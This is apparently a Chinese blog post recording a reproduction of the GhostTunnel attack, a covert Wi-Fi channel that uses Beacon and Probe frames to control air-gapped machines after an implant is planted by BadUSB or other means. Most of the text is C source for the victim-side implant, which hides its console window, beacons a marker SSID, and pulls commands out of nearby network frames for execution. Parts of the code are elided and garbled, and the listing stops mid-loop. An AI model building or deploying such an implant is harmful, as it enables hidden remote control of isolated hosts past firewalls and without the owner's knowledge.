# GhostTunne l 无线攻击简单复现记录
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
前段时间看到大佬们提到GhostTunnel，出于好奇心，打开搜索引擎了解一下。翻到关于GhostTunnel一篇文章，其中介绍的思路让人眼前一亮：[HITB议题-Ghost Tunnel攻击隔离网络的WiFi隐蔽传输通道](https://www.anquanke.com/post/id/107485#h3-1)
## 0x01 什么是GhostTunnel
这篇文章大致介绍了一种针对WIFI的物理隔离情况下，结合HID的攻击思路，并且命名为GhostTunnel攻击。  
GhostTunnel的攻击实现效果：在目标主机上通过远程植入或者HID设备植入客户端的情况下，通过WLAN的Beacon、Probe
Request和Probe
Response握手协议，实现在无线信号范围内，攻击者对目标主机进行控制行为。并且目标主机的WLAN不会真正实现连接，具有较强的隐蔽性。
这种攻击有以下这些优势：
    HID设备只用于植入攻击代码，当植入完成就可以移除了。（HID攻击外的其他植入形式也是可以的）
    没有正常的网络连接，可以绕过防火墙。
    不会对现有的网络通信及连接状态造成影响。
    跨平台支持。该攻击可用于任何拥有WiFi模块的设备，我们在Win7、Win10、Mac OSX上进行了测试。
    可在几十米内工作，配合信号桥接设备理论上可做到无限远。
文章中给出了思路和原理、实战视频演示效果，并且给了公开的PPT，但是没有给出具体的细节和代码  
搜索引擎相关只有一篇博客大致提供了参照：  
[基于Ghost Tunnel的实践，实现Air
Gapping环境下的通信与远程执行](https://blog.csdn.net/liu_si_yan/article/details/80268937)
于是开始尝试进行实现（折腾），折腾的过程和大概如下：
  1. 编写受害者端的程序，实现对网卡设备的监听和发送功能，监听指定SSID的Beacon和Probe Response帧，提取出携带的控制命令，发送Probe Request帧，进行被控端上线和命令执行结果的反馈。
  2. 编写控制端程序，也是实现对网卡设备的监听和发送功能，监听发送过来的Probe Request帧，提取执行结果，发送携带要执行的指令的Beacon和Probe Response帧。
  3. 通过Bad USB将被控端通过HID形式植入被攻击主机。（未完待续）
折腾的结果都放在了Github上，有需要的小伙伴可以看看：
另外，和师兄的研究整合后，师兄的项目地址：
## 0x02 Windows被控端
被控端需要完成：  
1、发送包含特定信息的Probe Request请求。  
2、监听Beacon和Probe Response帧，提取命令进行执行，命令以ccc开头作为掩码。
根据公开的PPT中介绍，选用了Windows的API来实现——Native WIFI API，其中主要涉及到的函数：
    WlanOpenHandle                  打开Wlan的句柄
    WlanEnumInterfaces              枚举网络设备
    WlanScan                        发起ProbeRequest请求
    WlanGetAvailableNetworkList     获取可用接入点
    WlanGetNetworkBssList           获得Bss列表
所有相关API以及相关数据结构的介绍、使用可以查看：
同时，需要做到控制台程序的隐蔽执行，控制程序在启动后需要将自身隐蔽起来，这里同样使用Windows的API来实现：
    HWND hwnd;
        hwnd = FindWindow(L"ConsoleWindowClass", NULL); //处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。  
        if (hwnd)
        {
            ShowWindow(hwnd, SW_HIDE);               //设置指定窗口的显示状态  
        }
最后，这里直接贴出被控端主要代码的代码框架，我们使用”command ok!!!!!!.”作为被控端的特殊标记：
    //payload数据结构
    struct ie_data
    {
        unsigned char id;
        unsigned char len;
        unsigned char val[1];
    };
    int wmain()
    {
        HWND hwnd;
        hwnd = FindWindow(L"ConsoleWindowClass", NULL); //处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。  
        if (hwnd)
        {
            ShowWindow(hwnd, SW_HIDE);               //设置指定窗口的显示状态  
        }
        // 申明初始化变量
        HANDLE hClient = NULL;
        DWORD dwMaxClient = 2;   //    
        DWORD dwCurVersion = 0;
        DWORD dwResult = 0;
        int iRet = 0;
        WCHAR GuidString[40] = { 0 };
        int i;
        /* variables used for WlanEnumInterfaces  */
        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        PWLAN_INTERFACE_INFO pIfInfo = NULL;
        //AVAILABLE属性
        PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL;
        PWLAN_AVAILABLE_NETWORK pBssEntry = NULL;
        //添加的Bss属性
        //PWLAN_BSS_ENTRY bss_entry = NULL;
        int iRSSI = 0;
        //封装payload
        struct ie_data      *piedata = NULL;
        int         response_len = 0;
        char            *response = NULL;
        //yunsle定义len和buf
        int len = 18;
        char *buf = "command ok!!!!!!.";
        response_len = sizeof(WLAN_RAW_DATA) - 1 + sizeof(struct ie_data) - 1 + len;
        response = (char *)malloc(response_len);
        memset(response, '', response_len);
        //yunsle定义pwlan_data的类型为PWLAN_RAW_DATA
        PWLAN_RAW_DATA pwlan_data = (PWLAN_RAW_DATA)response;
        pwlan_data->dwDataSize = sizeof(struct ie_data) - 1 + len;
        piedata = (struct ie_data *)&pwlan_data->DataBlob[0];
        piedata->id = (char)221;
        piedata->len = len;
        //buf为要发送的数据（最大长度240），len为数据长度
        memcpy(&piedata->val[0], buf, len);
        //循环接收命令
        while (true) {
            //打开wlan句柄
            dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
            if (dwResult != ERROR_SUCCESS) {
                ...........
            }
            //枚举wlan设备
            dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
            if (dwResult != ERROR_SUCCESS) {
                ...........
            }
            else {
                            ...........
            }
            //发送payload——————start
            PDOT11_SSID pdo = new DOT11_SSID;
            pdo->uSSIDLength = 19;
            UCHAR *ucp = NULL;
            ucp = (UCHAR *)&pdo->ucSSID;
            ucp = (UCHAR *)malloc(pdo->uSSIDLength);
            memset(ucp, '', pdo->uSSIDLength);
            strcpy((char*)ucp, "yunsle_ghost_tunnel");
            dwResult = WlanScan(hClient, &pIfInfo->InterfaceGuid, NULL, pwlan_data, NULL);
            if (dwResult != ERROR_SUCCESS) {
                ...........
            }
            else {
                ...........
            }
            //发送payload——————end
            free(pdo);
            //获取可用AP
            dwResult = WlanGetAvailableNetworkList(hClient,
                &pIfInfo->InterfaceGuid,
                0,
                NULL,
                &pBssList);
            if (dwResult != ERROR_SUCCESS) {
                 ...........
            }
            else {
                ...........
                //这里如果j从0开始，会有重复SSID项，原因不明，但不是引起多次执行命令的原因
                for (int j = (pBssList->dwNumberOfItems) / 2; j dwNumberOfItems; j++) {
                    pBssEntry =
                        (WLAN_AVAILABLE_NETWORK *)& pBssList->Network[j];
                    //获得BSS的LIST
                    //为了接收Probe Response帧，并解析出指令代码
                    PWLAN_BSS_LIST ppWlanBssList;
                    DWORD dwResult2 = WlanGetNetworkBssList(hClient, &pIfInfo->InterfaceGuid,
                        &pBssEntry->dot11Ssid,
                        pBssEntry->dot11BssType,
                        pBssEntry->bSecurityEnabled,
                        NULL,
                        &ppWlanBssList);
                    //错误处理
                    if (dwResult2 != ERROR_SUCCESS) {
                        ...........
                    }
                    if (pBssEntry->dot11Ssid.uSSIDLength == 0)
                        ...........
                    else {
                        //循环遍历AVAILABLE的BSSLisst数据
                        for (int z = 0; z dwNumberOfItems; z++)